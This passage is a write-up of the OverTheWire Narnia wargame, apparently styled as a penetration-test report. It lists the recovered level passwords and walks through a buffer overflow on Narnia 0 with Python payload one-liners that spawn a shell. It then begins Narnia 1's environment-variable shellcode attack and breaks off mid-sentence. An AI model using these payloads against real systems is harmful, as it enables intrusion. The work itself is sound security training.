href="#h.7l78l8n3eh28">56</a></span></p><p class="c13"><span class="c1"><a class="c14" href="#h.kxnobi7dhgec">Source Code</a></span><span class="c1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c1"><a class="c14" href="#h.kxnobi7dhgec">57</a></span></p><p class="c65"><span class="c45 c46 c27 c36"><a class="c14" href="#h.susjdnco5e24">Conclusion</a></span><span class="c45 c46 c27 c36">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c45 c27 c36 c46"><a class="c14" href="#h.susjdnco5e24">58</a></span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0 c29"><span class="c2"></span></p><h1 class="c47" id="h.ip86uerwz5x0"><span class="c49 c80 c46 c36 c87">Executive Summary</span></h1><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span class="c2">The source code of each program was given, however throughout this report each program will be treated as if we are not given this information. This approach is taken so as to replicate real-world environments in which an attacker most likely would not have knowledge on the source code of the binary he or she is trying to exploit.</span></p><p class="c0"><span>This penetration test resulted in the successful exploitation of all nine out of nine binaries. Among the vulnerabilities were the following: passing unsanitized input into functions, failure to check boundaries, using insecure functions, and unnecessarily disabling the NX bit. Remediations are outlined in the </span><span class="c38"><a class="c14" href="#h.susjdnco5e24">Conclusion</a></span><span>&nbsp;</span><span>section where specific vulnerabilities were described more in detail. </span><span class="c2">All users except root were compromised, and the password for each compromised user was retrieved:</span></p><p class="c0 c29"><span class="c2"></span></p><a id="t.9b9c68b7e56f20000acde6f91fefb5ed264a5aeb"></a><a id="t.0"></a><table class="c24"><tr class="c22"><td class="c35" colspan="1" rowspan="1"><p class="c37"><span class="c17">Username</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c37"><span class="c17">Password</span></p></td></tr><tr class="c22"><td class="c35" colspan="1" rowspan="1"><p class="c41"><span class="c1">narnia0</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c0"><span class="c1">narnia0</span></p></td></tr><tr class="c22"><td class="c35" colspan="1" rowspan="1"><p class="c41"><span class="c1">narnia1</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c0"><span class="c1">efeidiedae</span></p></td></tr><tr class="c79"><td class="c35" colspan="1" rowspan="1"><p class="c41"><span class="c1">narnia2</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c0"><span class="c1">nairiepecu</span></p></td></tr><tr class="c22"><td class="c35" colspan="1" rowspan="1"><p class="c41"><span class="c1">narnia3</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c0"><span class="c1">vaequeezee</span></p></td></tr><tr class="c22"><td class="c35" colspan="1" rowspan="1"><p class="c41"><span class="c1">narnia4</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c0"><span class="c1">thaenohtai</span></p></td></tr><tr class="c22"><td class="c35" colspan="1" rowspan="1"><p class="c41"><span class="c1">narnia5</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c0"><span class="c1">faimahchiy</span></p></td></tr><tr class="c22"><td class="c35" colspan="1" rowspan="1"><p class="c41"><span class="c1">narnia6</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c0"><span class="c1">neezocaeng</span></p></td></tr><tr class="c22"><td class="c35" colspan="1" rowspan="1"><p class="c41"><span class="c1">narnia7</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c0"><span class="c1">ahkiaziphu</span></p></td></tr><tr class="c22"><td class="c35" colspan="1" rowspan="1"><p class="c41"><span class="c1">narnia8</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c0"><span class="c1">mohthuphog</span></p></td></tr><tr class="c22"><td class="c35" colspan="1" rowspan="1"><p class="c41"><span class="c1">narnia9</span></p></td><td class="c35" colspan="1" rowspan="1"><p class="c0"><span class="c1">eiL5fealae</span></p></td></tr></table><h1 class="c47" id="h.1v4pnj65xmth"><span class="c49 c46 c80">Attack Narrative</span></h1><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span>Each binary gets increasingly harder. For every challenge, I have downloaded each binary by copying its base64 or base32 data on my attacking box. This was done to allow a further analysis into the binary by allowing the usage of pwndbg</span><sup><a href="#ftnt1" id="ftnt_ref1">[1]</a></sup><span>, Ghidra</span><sup><a href="#ftnt2" id="ftnt_ref2">[2]</a></sup><span class="c2">, and other tools that are not present on the target machine. </span></p><h2 class="c10" id="h.es2smgb3v3t5"><span>Narnia</span><span class="c40 c36">&nbsp;0</span></h2><p class="c0"><span class="c2">We are given the credentials for the narnia0 user, and with it we can ssh into the box.</span></p><h3 class="c10" id="h.aua361lc1ay"><span class="c5">Binary Analysis</span></h3><p class="c0"><span>Before trying to exploit the first binary by testing buffer overflows, we will check the security of the binary with the </span><span class="c27">checksec </span><span class="c2">command:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 551.01px; height: 171.83px;"><img alt="" src="images/image7.png" style="width: 551.01px; height: 171.83px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">The &ldquo;Arch&rdquo; row shows that this binary is a 32 bit program and whose endianness is little-endian. Additionally, we can see that NX (non-execute), the bit responsible for not allowing writable memories to be executed, is enabled. This means that we cannot inject shellcode into the function. We can get a little more information about the binary by using the file command:</span></p><a id="t.2c18f078ee436f7f48c0b82b441453feb6a059e2"></a><a id="t.1"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">&#9484;&#9472;[</span><span class="c8">0xd4</span><span class="c3">y</span><span class="c12">@Writeup</span><span class="c3">]&#9472;[~</span><span class="c12">/business/other/overthewire/narnia</span><span class="c3">]<br>&#9492;&#9472;&#9472;&#9596; </span><span class="c12">$file</span><span class="c3">&nbsp;narnia</span><span class="c8">0</span><span class="c3">&nbsp;<br></span><span class="c11">narnia0:</span><span class="c3">&nbsp;ELF </span><span class="c8">32</span><span class="c3">-bit LSB executable, Intel </span><span class="c8">80386</span><span class="c3">, version </span><span class="c8">1</span><span class="c3">&nbsp;(SYSV), dynamically linked, interpreter /lib/ld-linux.so.</span><span class="c8">2</span><span class="c3">, </span><span class="c6">for</span><span class="c3">&nbsp;GNU/Linux </span><span class="c8">2.6</span><span class="c3">.</span><span class="c8">32</span><span class="c3">, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, </span><span class="c6">not</span><span class="c3">&nbsp;stripped</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span class="c2">Note how this file is not stripped which means it will contain debug information regarding symbols and functions. This will give us a little bit more information as to what is going on with the binary when we try to reverse engineer it.</span></p><p class="c0"><span class="c2">Running the program, we can see that it is asking for a certain value in the function to be changed.</span></p><a id="t.29621f93723ba9ef2ed447b650cf2ed7be65c93c"></a><a id="t.2"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia0@narnia:/narnia$ ./narnia0<br>Correct val&#39;s value from </span><span class="c8">0</span><span class="c3">x41414141 -&gt; </span><span class="c8">0</span><span class="c3">xdeadbeef!<br>Here is your chance: test<br>buf: test<br>val: </span><span class="c8">0</span><span class="c3">x41414141<br>WAY OFF!!!!</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span class="c2">Attempting to write the four letter word &ldquo;test&rdquo; to the buffer proves to be an inadequate length for overflowing the buffer as the value did not change. </span></p><h3 class="c10" id="h.hjua9cypbazu"><span class="c5">Buffer Overflow</span></h3><p class="c0"><span class="c2">We can verify that this value can be modified by attempting to flood the buffer with a long string of characters:</span></p><a id="t.ab04f61f9bdfd8285658e11c00b9bb4587dfec3c"></a><a id="t.3"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">&#9484;&#9472;[</span><span class="c8">0xd4</span><span class="c3">y</span><span class="c12">@Writeup</span><span class="c3">]&#9472;[~</span><span class="c12">/business/other/overthewire/narnia</span><span class="c3">]<br>&#9492;&#9472;&#9472;&#9596; </span><span class="c12">$pwn</span><span class="c3">&nbsp;cyclic </span><span class="c8">100</span><span class="c3"><br>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span></p></td></tr></table><p class="c29 c70"><span class="c2"></span></p><a id="t.6592d5d7c19a56b7df20992afd6516b4efb9500c"></a><a id="t.4"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia0@narnia:/narnia$ ./narnia0<br>Correct val&#39;s value from </span><span class="c8">0</span><span class="c3">x41414141 -&gt; </span><span class="c8">0</span><span class="c3">xdeadbeef!<br>Here is your chance: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa<br>buf: aaaabaaacaaadaaaeaaafaaa<br>val: </span><span class="c8">0</span><span class="c3">x61616166<br>WAY OFF!!!!</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span>Observe that the value has changed from </span><span class="c8">0</span><span class="c3">x41414141</span><span>&nbsp;to </span><span class="c8">0</span><span class="c3">x61616166</span><span>&nbsp;confirming that there is a buffer overflow vulnerability. To calculate the offset, the </span><span class="c27">-l</span><span class="c2">&nbsp;flag can be utilized in the pwn command:</span></p><a id="t.ced530898c59f7c144858fde2e514f40600872d7"></a><a id="t.5"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">&#9484;&#9472;[</span><span class="c8">0xd4</span><span class="c3">y</span><span class="c12">@Writeup</span><span class="c3">]&#9472;[~</span><span class="c12">/business/other/overthewire/narnia</span><span class="c3">]<br>&#9492;&#9472;&#9472;&#9596; </span><span class="c12">$pwn</span><span class="c3">&nbsp;cyclic -l </span><span class="c8">0x61616166</span><span class="c3"><br></span><span class="c8">20</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span>Seeing as the offset is 20 bytes, it is possible to input up to 20 bytes into the buffer before the value gets changed. Thus the payload will incorporate a string of 20 bytes followed by 0xdeadbeef in little endian which is </span><span class="c27">\xef\xbe\xad\xde</span><span class="c2">. Conducting this attack reveals the following:</span></p><a id="t.b298c4c68ae04a368619c6bfc10711b265ef958a"></a><a id="t.6"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia</span><span class="c8">0</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">python -c </span><span class="c11">&quot;print &#39;A&#39;*20+&#39;\xef\xbe\xad\xde&#39;&quot;</span><span class="c3">|./narnia</span><span class="c8">0</span><span class="c3">&nbsp;<br>Correct val</span><span class="c11">&#39;s value from 0x41414141 -&gt; 0xdeadbeef!<br>Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA&#65453;<br>val: 0xdeadbeef</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span>The attack has been successfully performed as can be seen from the overwritten value and lack of the </span><span class="c3">WAY OFF!!!!</span><span>&nbsp;message. However, no shell was given. Analysing this program in radare2 reveals that we should be getting a </span><span class="c27">/bin/sh</span><span class="c2">&nbsp;shell:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 46.67px;"><img alt="" src="images/image1.png" style="width: 624.00px; height: 46.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>Upon further thought into the reason for not receiving a shell, it came to mind that perhaps the shell is dying with the process of piping the python command into the narnia0 binary. It is possible that stdin is attached to this process and therefore the shell immediately dies. Appening </span><span class="c27">;cat -</span><span>&nbsp;to the end of the command proves to work (this is because </span><span class="c27">cat -</span><span>&nbsp;outputs stdin).</span></p><a id="t.9ab229bb95212641331aa2e44287c3eecd85209d"></a><a id="t.7"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia</span><span class="c8">0</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">(python -c </span><span class="c11">&quot;print &#39;A&#39;*20+&#39;\xef\xbe\xad\xde&#39;&quot;</span><span class="c3">;cat -)|./narnia</span><span class="c8">0</span><span class="c3">&nbsp;<br> <br>Correct val</span><span class="c11">&#39;s value from 0x41414141 -&gt; 0xdeadbeef!<br>Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA&#65453;<br>val: 0xdeadbeef<br>whoami<br>narnia1<br>cat /etc/narnia_pass/narnia1<br>efeidiedae</span></p></td></tr></table><p class="c0"><span class="c50 c49 c31 c46">Commands are successfully being executed inside the /bin/sh shell</span></p><p class="c0"><span class="c2">Looking at the source code of the program, we can confirm that the aforementioned analysis of the binary was correct:</span></p><a id="t.887fa3cd8b65b81244153c19f4cd9692970c91f6"></a><a id="t.8"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">#include &lt;stdio.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;stdlib.h&gt;</span><span class="c3"><br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">main</span><span class="c8">()</span><span class="c3">{<br> &nbsp; &nbsp;</span><span class="c6">long</span><span class="c3">&nbsp;val=</span><span class="c8">0x41414141</span><span class="c3">;<br> &nbsp; &nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;buf[</span><span class="c8">20</span><span class="c3">];<br><br> &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;</span><span class="c3">);<br> &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;Here is your chance: &quot;</span><span class="c3">);<br> &nbsp; &nbsp;</span><span class="c8">scanf</span><span class="c3">(</span><span class="c11">&quot;%24s&quot;</span><span class="c3">,&amp;buf);<br><br> &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;buf: %s\n&quot;</span><span class="c3">,buf);<br> &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;val: 0x%08x\n&quot;</span><span class="c3">,val);<br><br> &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">(val==</span><span class="c8">0xdeadbeef</span><span class="c3">){<br> &nbsp; &nbsp; &nbsp; &nbsp;setreuid(geteuid(),geteuid());<br> &nbsp; &nbsp; &nbsp; &nbsp;system(</span><span class="c11">&quot;/bin/sh&quot;</span><span class="c3">);<br> &nbsp; &nbsp;}<br> &nbsp; &nbsp;</span><span class="c6">else</span><span class="c3">&nbsp;{<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;WAY OFF!!!!\n&quot;</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">exit</span><span class="c3">(</span><span class="c8">1</span><span class="c3">);<br> &nbsp; &nbsp;}<br><br> &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}</span></p></td></tr></table><h3 class="c10" id="h.faqz5avaj4l1"><span class="c5">Source Code</span></h3><a id="t.887fa3cd8b65b81244153c19f4cd9692970c91f6"></a><a id="t.9"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">#include &lt;stdio.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;stdlib.h&gt;</span><span class="c3"><br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">main</span><span class="c8">()</span><span class="c3">{<br> &nbsp; &nbsp;</span><span class="c6">long</span><span class="c3">&nbsp;val=</span><span class="c8">0x41414141</span><span class="c3">;<br> &nbsp; &nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;buf[</span><span class="c8">20</span><span class="c3">];<br><br> &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;</span><span class="c3">);<br> &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;Here is your chance: &quot;</span><span class="c3">);<br> &nbsp; &nbsp;</span><span class="c8">scanf</span><span class="c3">(</span><span class="c11">&quot;%24s&quot;</span><span class="c3">,&amp;buf);<br><br> &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;buf: %s\n&quot;</span><span class="c3">,buf);<br> &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;val: 0x%08x\n&quot;</span><span class="c3">,val);<br><br> &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">(val==</span><span class="c8">0xdeadbeef</span><span class="c3">){<br> &nbsp; &nbsp; &nbsp; &nbsp;setreuid(geteuid(),geteuid());<br> &nbsp; &nbsp; &nbsp; &nbsp;system(</span><span class="c11">&quot;/bin/sh&quot;</span><span class="c3">);<br> &nbsp; &nbsp;}<br> &nbsp; &nbsp;</span><span class="c6">else</span><span class="c3">&nbsp;{<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;WAY OFF!!!!\n&quot;</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">exit</span><span class="c3">(</span><span class="c8">1</span><span class="c3">);<br> &nbsp; &nbsp;}<br><br> &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}</span></p></td></tr></table><h2 class="c10" id="h.8oz60692a7cl"><span class="c40 c36">Narnia 1</span></h2><p class="c0"><span class="c2">Now with a shell as the narnia1 user, we have the necessary permissions to execute the next binary:</span></p><a id="t.243bc660bfbb878f9a5dbc19209fa56e438574f9"></a><a id="t.10"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia1@narnia:/narnia$ ./narnia1 <br>Give me something to</span><span class="c8">&nbsp;execute </span><span class="c3">at the env-variable EGG</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>We can see that the binary is expecting an environment variable called EGG. The program states that it will execute this environment variable, hinting at the fact that this binary may be vulnerable to an environment variable buffer overflow</span><sup><a href="#ftnt3" id="ftnt_ref3">[3]</a></sup><span class="c2">. Before attempting a buffer overflow, we can provide a simple string to the EGG environment variable to see how the binary is meant to behave:</span></p><a id="t.e3704c0ea0133fc4bc8c5461197b4bd9f6f9c67d"></a><a id="t.11"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia1@narnia:/narnia$ export EGG=1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>narnia1@narnia:/narnia$ ./narnia1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Trying to</span><span class="c8">&nbsp;execute </span><span class="c3">EGG! &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Segmentation fault &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p></td></tr></table><h3 class="c10" id="h.lt9yn9n3bj0q"><span>Binary Analysis</span></h3><p class="c0"><span class="c2">After only providing one byte, the program experienced a segmentation fault. To further understand how this binary works, a long string of A&rsquo;s can be exported to determine where the content of the environment variable is in the buffer (this was performed locally so as to have the ability to analyze with pwndbg):</span></p><a id="t.36725aa1f31c4984df954bfe328d7035dd4cfa8a"></a><a id="t.12"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/narnia/1] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>&#9492;&#9472;&#9472;&#9596; </span><span class="c12">$gdb</span><span class="c3">&nbsp;./narnia1 -q &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>pwndbg: loaded 196 commands.</span><span class="c8">&nbsp;Type </span><span class="c3">pwndbg [filter] </span><span class="c6">for</span><span class="c3">&nbsp;a list. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>pwndbg: created </span><span class="c12">$rebase</span><span class="c3">, </span><span class="c12">$ida</span><span class="c3">&nbsp;gdb functions (can be used with print/break) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Reading symbols </span><span class="c6">from</span><span class="c3">&nbsp;./narnia1</span><span class="c8">..</span><span class="c3">. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>(</span><span class="c8">No</span><span class="c3">&nbsp;debugging symbols found </span><span class="c6">in</span><span class="c3">&nbsp;./narnia1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>pwndbg&gt; r &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting program: /home/0xd4y/business/other/overthewire/narnia/1/narnia1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Trying </span><span class="c6">to</span><span class="c3">&nbsp;execute EGG! &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Program received signal SIGSEGV, Segmentation fault. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffddf3 </span><span class="c6">in</span><span class="c3">&nbsp;?? () &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span>We get a segmentation fault as expected, however the EIP register is not getting overwritten (an address of </span><span class="c3">0x41414141</span><span>&nbsp; was expected, but instead it is </span><span class="c3">0xffffddf3</span><span>). It is possible that the program is using the </span><span class="c27">getenv()</span><span>&nbsp;function</span><sup><a href="#ftnt4" id="ftnt_ref4">[4]</a></sup><span class="c2">&nbsp;without storing the environment variable in a buffer.</span></p><h3 class="c10" id="h.f521hvia84ja"><span>Exporting </span><span class="c5">Shellcode into the Environment Variable</span></h3><p class="c0"><span class="c2">As can be seen from the segmentation fault error, the program is failing to validate the size and / or content of the environment variable. The program earlier stated that it will execute whatever is inside the EGG environment variable. The checksec command can be used to determine if the binary could execute shellcode:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 202.67px;"><img alt="" src="images/image14.png" style="width: 624.00px; height: 202.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">Seeing as NX is disabled, the program might execute shellcode upon exporting shellcode to the EGG environment variable.</span></p><p class="c0"><span>There are many different shellcodes to use, but for the purpose of this exercise I chose the /bin/sh shellcode from </span><span class="c38"><a class="c14" href="https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-827.php&amp;sa=D&amp;source=editors&amp;ust=1653862984600276&amp;usg=AOvVaw3mvMKazajKlAB6SL_TGEYe">here</a></span><sup><a href="#ftnt5" id="ftnt_ref5">[5]</a></sup><span class="c2">. However, exporting this shellcode into the EGG environment variable and executing the program proves 